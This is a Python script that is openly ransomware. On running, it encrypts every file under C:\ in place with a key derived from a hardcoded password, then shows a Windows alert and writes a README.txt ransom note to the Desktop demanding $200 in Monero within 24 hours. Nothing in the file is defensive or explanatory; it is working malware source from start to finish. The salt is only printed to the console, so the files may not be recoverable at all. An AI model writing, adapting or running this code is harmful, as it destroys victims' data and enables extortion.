import os
from datetime import datetime
import ctypes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from base64 import urlsafe_b64encode
from getpass import getpass

current_datetime = datetime.now()

formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")

def get_desktop_path():
    try:
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        return desktop
    except Exception as e:
        return f"An error occurred: {e}"

def create_readme_on_desktop():
    try:
        # Locate the desktop path
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        
        # Define the file path
        readme_path = os.path.join(desktop, "README.txt")
        
        # Create the file with message 'A'
        with open(readme_path, 'w') as file:
            file.write(f"""
!READ CAREFULLY!
THIS COMPUTER HAS BEEN INFECTED WITH RANSOMWARE, ALL YOUR FILES ARE ENCRYPTED AND THE ONLY WAY TO GET THEM BACK IS BY PAYING $200 AT THIS ADDRESS () IN MONERO!
YOU HAVE 24 HOURS STARTING FROM {formatted_datetime}

ANY ATTEMPT TO DECRYPT, RENAME, MOVE OR INTERACTING WITH THESE FILES WILL CORRUPT THEM ENTIRELTY...
                       
                       """)
        
        print(f"README.txt created at: {readme_path}")
    except Exception as e:
        print(f"An error occurred: {e}")

def open_readme():
    os.system(f'{desktop_path}/README.txt')

def alert():
    ctypes.windll.user32.MessageBoxW(0, f"""
!READ CAREFULLY!
THIS COMPUTER HAS BEEN INFECTED WITH RANSOMWARE, ALL YOUR FILES ARE ENCRYPTED AND THE ONLY WAY TO GET THEM BACK IS BY PAYING $200 AT THIS ADDRESS () IN MONERO!
YOU HAVE 24 HOURS STARTING FROM {formatted_datetime}

ANY ATTEMPT TO DECRYPT, RENAME, MOVE OR INTERACTING WITH THESE FILES WILL CORRUPT THEM ENTIRELTY...
THIS MESSAGE CAN BE FOUND AT YOUR DESKTOP AS README.txt
                       
                       """, "Alert", 1)

import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from base64 import urlsafe_b64encode
from getpass import getpass

def derive_key(password, salt):
    """Derive a Fernet key from the password using a salt."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return urlsafe_b64encode(kdf.derive(password.encode()))

def generate_fernet(password):
    """Generate a Fernet object using the password."""
    salt = os.urandom(16)  # Generate a random salt
    derived_key = derive_key(password, salt)
    return Fernet(derived_key), salt

def encrypt_file(file_path, fernet):
    """Encrypt a file using the provided Fernet object."""
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()

        encrypted_data = fernet.encrypt(file_data)

        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
    except PermissionError:
        print(f"Permission denied: {file_path}")
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")


def encrypt_all_files(root_dir, password, script_name):
    """Encrypt all files in all directories, excluding the script itself."""
    fernet, salt = generate_fernet(password)

    # Walk through all directories and files
    for root, dirs, files in os.walk(root_dir):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            # Skip the encryption script itself
            if file_name == script_name:
                continue
            print(f"Encrypting: {file_path}")
            encrypt_file(file_path, fernet)

    print("Encryption of all files (except the script) is complete.")
    print(f"Remember this salt for decryption: {salt.hex()}")

# Get the current script name
script_name = os.path.basename(__file__)

# Ask for a password to generate the encryption key
password = "lol"

# Set the root directory (e.g., C:\)
root_directory = "C:\\"

# Encrypt all files in all directories, except the script
encrypt_all_files(root_directory, password, script_name)

desktop_path = get_desktop_path()
alert()
create_readme_on_desktop()
open_readme()

